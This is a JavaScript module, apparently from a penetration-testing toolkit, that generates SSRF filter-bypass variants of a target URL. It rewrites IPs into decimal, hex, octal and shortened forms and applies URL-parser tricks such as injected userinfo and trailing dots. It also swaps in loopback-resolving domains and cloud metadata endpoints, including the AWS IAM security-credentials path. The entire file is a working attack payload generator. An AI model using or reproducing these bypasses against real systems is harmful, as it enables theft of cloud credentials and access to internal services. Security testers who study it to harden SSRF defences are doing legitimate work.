/** Target-aware SSRF URL-obfuscation engine. */

import { ipToDecimal, ipToHex, ipToOctal, urlEncode } from '../utils/encoding.js'
import { extractHostnameIp, parseUrl } from '../utils/helpers.js'
import { finalizeVariants } from '../utils/variants.js'

function userInfo(parsed) {
  return parsed.credentials ?? ''
}
function displayHost(hostname) {
  if (hostname.includes(':') && !hostname.startsWith('[')) return `[${hostname}]`
  return hostname
}

function rebuildUrl(parsed, hostname, options = {}) {
  const port = options.port === undefined ? parsed.port : options.port
  const credentials = options.credentials === undefined ? userInfo(parsed) : options.credentials
  const path = options.path ?? parsed.rawSuffix
  return `${parsed.protocol}//${credentials}${displayHost(hostname)}${port ? `:${port}` : ''}${path}`
}

function withParsedUrl(payload, transform) {
  const parsed = parseUrl(payload)
  if (!parsed.valid) return []
  return transform(parsed)
}

function applyIpDecimal(payload) {
  const ip = extractHostnameIp(payload)
  if (!ip) return []
  return withParsedUrl(payload, (parsed) => [rebuildUrl(parsed, String(ipToDecimal(ip)))])
}

function applyIpHex(payload) {
  const ip = extractHostnameIp(payload)
  if (!ip) return []
  return withParsedUrl(payload, (parsed) => {
    const perOctet = ip.split('.')
      .map((part) => `0x${Number(part).toString(16).padStart(2, '0')}`)
      .join('.')
    return [rebuildUrl(parsed, ipToHex(ip)), rebuildUrl(parsed, perOctet)]
  })
}

function applyIpOctal(payload) {
  const ip = extractHostnameIp(payload)
  if (!ip) return []
  return withParsedUrl(payload, (parsed) => {
    const parts = ip.split('.')
    const mixed = `0${Number(parts[0]).toString(8)}.${parts.slice(1).join('.')}`
    return [rebuildUrl(parsed, ipToOctal(ip)), rebuildUrl(parsed, mixed)]
  })
}

function applyIpShort(payload) {
  const ip = extractHostnameIp(payload)
  if (!ip) return []
  return withParsedUrl(payload, (parsed) => {
    if (ip.startsWith('127.')) {
      return [
        rebuildUrl(parsed, '127.1'),
        rebuildUrl(parsed, '0'),
        rebuildUrl(parsed, 'localhost'),
        rebuildUrl(parsed, '::1'),
        rebuildUrl(parsed, '::ffff:127.0.0.1'),
      ]
    }
    const parts = ip.split('.')
    return [rebuildUrl(parsed, `::ffff:${ip}`), ...(parts[3] === '0' ? [rebuildUrl(parsed, parts.slice(0, 3).join('.'))] : [])]
  })
}

function applyUrlTricks(payload) {
  return withParsedUrl(payload, (parsed) => {
    const host = parsed.hostname
    const path = parsed.rawSuffix
    const variants = [
      rebuildUrl(parsed, `${host}.`),
      rebuildUrl(parsed, urlEncode(host)),
      rebuildUrl(parsed, host, { path: `//${path.replace(/^\//, '')}` }),
    ]

    // Replacing supplied credentials changes authenticated request semantics.
    // Only introduce userinfo when the original URL did not already contain it.
    if (!parsed.credentials) variants.unshift(rebuildUrl(parsed, host, { credentials: 'anything@' }))

    if (!parsed.port) {
      variants.push(rebuildUrl(parsed, host, { port: parsed.protocol === 'https:' ? '443' : '80' }))
    }
    return variants
  })
}

function applyDnsRedirect(payload, target) {
  const variants = []
  const ip = extractHostnameIp(payload)
  const parsed = parseUrl(payload)

  if (target === 'cloud') {
    const protocol = parsed.valid ? parsed.protocol : 'http:'
    variants.push(
      `${protocol}//169.254.169.254/latest/meta-data/`,
      `${protocol}//169.254.169.254/latest/meta-data/iam/security-credentials/`,
      `${protocol}//metadata.google.internal/computeMetadata/v1/`,
      `${protocol}//100.100.100.200/latest/meta-data/`,
    )
  }

  if (parsed.valid && ip?.startsWith('127.')) {
    variants.push(
      rebuildUrl(parsed, 'localtest.me'),
      rebuildUrl(parsed, '127.0.0.1.nip.io'),
      rebuildUrl(parsed, '127.0.0.1.sslip.io'),
    )
  }

  return variants
}

export function generateSsrfVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = [{ payload, label: 'Original', layers: [] }]
  const add = (values, label, layer, extra = {}) => values.forEach((value) => {
    allVariants.push({ payload: value, label, layers: [layer], ...extra })
  })

  const legacyIp = {
    validity: 'conditional',
    note: 'Requires a URL parser or resolver that accepts legacy non-canonical IP notation.',
  }
  if (layers.includes('ip-decimal')) add(applyIpDecimal(payload), 'IP Decimal', 'ip-decimal', legacyIp)
  if (layers.includes('ip-hex')) add(applyIpHex(payload), 'IP Hex', 'ip-hex', legacyIp)
  if (layers.includes('ip-octal')) add(applyIpOctal(payload), 'IP Octal', 'ip-octal', legacyIp)
  if (layers.includes('ip-short')) add(applyIpShort(payload), 'IP Short', 'ip-short', legacyIp)
  if (layers.includes('url-tricks')) add(applyUrlTricks(payload), 'URL Parser Trick', 'url-tricks', {
    validity: 'conditional',
    note: 'Behavior depends on how the target URL parser normalizes the authority.',
  })
  if (layers.includes('dns-redirect')) add(applyDnsRedirect(payload, target), 'DNS/Metadata Variant', 'dns-redirect', {
    validity: 'conditional',
    note: target === 'cloud'
      ? 'Cloud metadata headers and platform-specific controls may also be required.'
      : 'Requires DNS resolution and validation behavior compatible with the selected hostname.',
  })

  if (layers.includes('ip-decimal') && layers.includes('url-tricks')) {
    const parsed = parseUrl(payload)
    const ip = extractHostnameIp(payload)
    if (parsed.valid && ip) {
      allVariants.push({
        payload: rebuildUrl(parsed, String(ipToDecimal(ip)), { credentials: 'anything@' }),
        label: 'Decimal + Userinfo',
        layers: ['ip-decimal', 'url-tricks'],
        validity: 'conditional',
        note: 'Requires a parser that accepts legacy numeric IPv4 notation.',
      })
    }
  }

  return finalizeVariants(allVariants, layers)
}
